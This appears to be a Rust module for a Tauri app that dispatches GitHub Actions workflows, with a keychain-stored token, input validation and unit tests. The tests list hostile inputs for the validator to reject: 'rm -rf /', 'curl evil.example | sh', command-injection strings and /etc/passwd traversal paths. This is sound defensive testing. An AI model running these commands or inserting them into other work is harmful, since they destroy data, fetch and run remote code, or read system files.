//! GitHub Actions bridge: the only backend runtime is the `backend.yml` workflow.
//!
//! The personal access token lives in the operating system keychain, never in the repository,
//! the bundle, or the web UI. See docs/backend-runtime.md.

use std::time::Duration;

use keyring::Entry;
use reqwest::header::{ACCEPT, AUTHORIZATION, USER_AGENT};
use serde::{Deserialize, Serialize};

const REPO: &str = "RandyRahmansyah7/geoint-prospect";
const WORKFLOW_FILE: &str = "backend.yml";
const DEFAULT_BRANCH: &str = "main";
const API_BASE: &str = "https://api.github.com";
const KEYRING_SERVICE: &str = "geoint-prospect";
const KEYRING_USER: &str = "github-token";

/// Pipelines the app may request. Anything else never reaches the API.
const ALLOWED_PIPELINES: [&str; 3] = ["healthcheck", "tabular-normalize", "ingest-tabular"];

#[derive(Debug, Clone, Serialize)]
pub struct TokenStatus {
    pub configured: bool,
}

#[derive(Debug, Deserialize)]
pub struct DispatchRequest {
    pub pipeline: String,
    pub request_id: String,
    pub input_path: Option<String>,
    /// Registered source id from configs/sources, required by ingestion pipelines.
    pub source_id: Option<String>,
    pub dry_run: bool,
}

#[derive(Debug, Serialize)]
pub struct DispatchResult {
    pub request_id: String,
    pub run_title: String,
}

#[derive(Debug, Serialize)]
pub struct JobStatus {
    pub state: String,
    pub conclusion: Option<String>,
    pub url: String,
    pub created_at: String,
    pub updated_at: String,
}

#[derive(Debug, Deserialize)]
struct WorkflowRuns {
    workflow_runs: Vec<WorkflowRun>,
}

#[derive(Debug, Deserialize)]
struct WorkflowRun {
    display_title: String,
    status: String,
    conclusion: Option<String>,
    html_url: String,
    created_at: String,
    updated_at: String,
}

fn entry() -> Result<Entry, String> {
    Entry::new(KEYRING_SERVICE, KEYRING_USER).map_err(|e| format!("keychain unavailable: {e}"))
}

fn token() -> Result<String, String> {
    entry()?
        .get_password()
        .map_err(|_| "no GitHub token stored; add one on the System Status page".to_string())
}

fn client() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .build()
        .map_err(|e| format!("http client failed: {e}"))
}

fn validate(request: &DispatchRequest) -> Result<(), String> {
    if !ALLOWED_PIPELINES.contains(&request.pipeline.as_str()) {
        return Err(format!(
            "pipeline '{}' is not allowed; allowed: {}",
            request.pipeline,
            ALLOWED_PIPELINES.join(", ")
        ));
    }
    if !is_identifier(request.request_id.as_str()) {
        return Err("request id must be 1-64 characters of [A-Za-z0-9._-]".to_string());
    }
    if let Some(path) = request.input_path.as_deref() {
        if !path.is_empty() && (path.starts_with('/') || path.contains("..")) {
            return Err("input path must be repository-relative and without '..'".to_string());
        }
    }
    if let Some(source_id) = request.source_id.as_deref() {
        if !source_id.is_empty() && !is_identifier(source_id) {
            return Err("source id must be 1-64 characters of [A-Za-z0-9._-]".to_string());
        }
    }
    if request.pipeline == "ingest-tabular" && request.source_id.as_deref().unwrap_or("").is_empty()
    {
        return Err("ingest-tabular needs a registered source id".to_string());
    }
    Ok(())
}

fn is_identifier(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 64
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(pipeline: &str, request_id: &str, input_path: Option<&str>) -> DispatchRequest {
        DispatchRequest {
            pipeline: pipeline.to_string(),
            request_id: request_id.to_string(),
            input_path: input_path.map(str::to_string),
            source_id: Some("fixtures-observations".to_string()),
            dry_run: true,
        }
    }

    #[test]
    fn allows_only_registered_pipelines() {
        assert!(validate(&request("healthcheck", "req-1", None)).is_ok());
        assert!(validate(&request("ingest-tabular", "req-1", None)).is_ok());

        for hostile in [
            "rm -rf /",
            "curl evil.example | sh",
            "tabular-normalize;whoami",
            "",
        ] {
            assert!(
                validate(&request(hostile, "req-1", None)).is_err(),
                "pipeline '{hostile}' must be refused"
            );
        }
    }

    #[test]
    fn refuses_request_ids_that_are_not_safe_identifiers() {
        for hostile in [
            "",
            " ",
            "id with spaces",
            "id;rm -rf /",
            "../../etc/passwd",
            "id$IFS",
            "id\ninjected",
            &"a".repeat(65),
        ] {
            assert!(
                validate(&request("healthcheck", hostile, None)).is_err(),
                "request id '{hostile}' must be refused"
            );
        }
    }

    #[test]
    fn refuses_input_paths_that_leave_the_repository() {
        for hostile in [
            "/etc/passwd",
            "../secret.csv",
            "..",
            "engine/../../etc/passwd",
        ] {
            assert!(validate(&request("tabular-normalize", "req-1", Some(hostile))).is_err());
        }

        assert!(validate(&request(
            "tabular-normalize",
            "req-1",
            Some("engine/tests/fixtures/observations.csv")
        ))
        .is_ok());

        // An empty value means "not provided": the workflow default applies.
        assert!(validate(&request("tabular-normalize", "req-1", Some(""))).is_ok());
    }

    #[test]
    fn refuses_source_ids_that_are_not_registered_shaped() {
        for hostile in [
            "https://evil.example/x.csv",
            "a;rm -rf /",
            "a b",
            "../etc",
            &"a".repeat(65),
        ] {
            let mut hostile_request = request("ingest-tabular", "req-1", None);
            hostile_request.source_id = Some(hostile.to_string());
            assert!(
                validate(&hostile_request).is_err(),
                "source id '{hostile}' must be refused"
            );
        }

        assert!(validate(&request("ingest-tabular", "req-1", None)).is_ok());
    }

    #[test]
    fn ingestion_pipelines_require_a_source_id() {
        let mut without_source = request("ingest-tabular", "req-1", None);
        without_source.source_id = None;

        assert!(validate(&without_source).is_err());
    }
}

#[tauri::command]
pub fn github_token_status() -> TokenStatus {
    TokenStatus {
        configured: token().is_ok(),
    }
}

#[tauri::command]
pub fn set_github_token(value: String) -> Result<TokenStatus, String> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Err("token must not be empty".to_string());
    }
    entry()?
        .set_password(trimmed)
        .map_err(|e| format!("could not store the token: {e}"))?;
    Ok(TokenStatus { configured: true })
}

#[tauri::command]
pub fn clear_github_token() -> Result<TokenStatus, String> {
    match entry()?.delete_credential() {
        Ok(()) => Ok(TokenStatus { configured: false }),
        Err(keyring::Error::NoEntry) => Ok(TokenStatus { configured: false }),
        Err(e) => Err(format!("could not remove the token: {e}")),
    }
}

#[tauri::command]
pub async fn dispatch_backend_job(request: DispatchRequest) -> Result<DispatchResult, String> {
    validate(&request)?;
    let token = token()?;

    // Only send what the caller supplied: omitted inputs keep their workflow defaults.
    let mut inputs = serde_json::Map::new();
    inputs.insert("pipeline".into(), serde_json::json!(request.pipeline));
    inputs.insert("request_id".into(), serde_json::json!(request.request_id));
    inputs.insert(
        "dry_run".into(),
        serde_json::json!(if request.dry_run { "true" } else { "false" }),
    );
    for (key, value) in [
        ("input_path", request.input_path.as_deref()),
        ("source_id", request.source_id.as_deref()),
    ] {
        if let Some(value) = value.filter(|v| !v.is_empty()) {
            inputs.insert(key.into(), serde_json::json!(value));
        }
    }

    let response = client()?
        .post(format!(
            "{API_BASE}/repos/{REPO}/actions/workflows/{WORKFLOW_FILE}/dispatches"
        ))
        .header(ACCEPT, "application/vnd.github+json")
        .header(USER_AGENT, "geoint-prospect")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .json(&serde_json::json!({ "ref": DEFAULT_BRANCH, "inputs": inputs }))
        .send()
        .await
        .map_err(|e| format!("dispatch failed: {e}"))?;

    if !response.status().is_success() {
        let status = response.status();
        let body = response.text().await.unwrap_or_default();
        return Err(format!("GitHub rejected the dispatch ({status}): {body}"));
    }

    Ok(DispatchResult {
        run_title: format!("backend {}", request.request_id),
        request_id: request.request_id,
    })
}

#[tauri::command]
pub async fn backend_job_status(request_id: String) -> Result<Option<JobStatus>, String> {
    let token = token()?;
    let expected = format!("backend {request_id}");

    let response = client()?
        .get(format!(
            "{API_BASE}/repos/{REPO}/actions/runs?event=workflow_dispatch&per_page=50"
        ))
        .header(ACCEPT, "application/vnd.github+json")
        .header(USER_AGENT, "geoint-prospect")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .send()
        .await
        .map_err(|e| format!("status request failed: {e}"))?;

    if !response.status().is_success() {
        let status = response.status();
        let body = response.text().await.unwrap_or_default();
        return Err(format!(
            "GitHub rejected the status request ({status}): {body}"
        ));
    }

    let runs: WorkflowRuns = response
        .json()
        .await
        .map_err(|e| format!("unexpected GitHub response: {e}"))?;

    Ok(runs
        .workflow_runs
        .into_iter()
        .find(|run| run.display_title == expected)
        .map(|run| JobStatus {
            state: run.status,
            conclusion: run.conclusion,
            url: run.html_url,
            created_at: run.created_at,
            updated_at: run.updated_at,
        }))
}
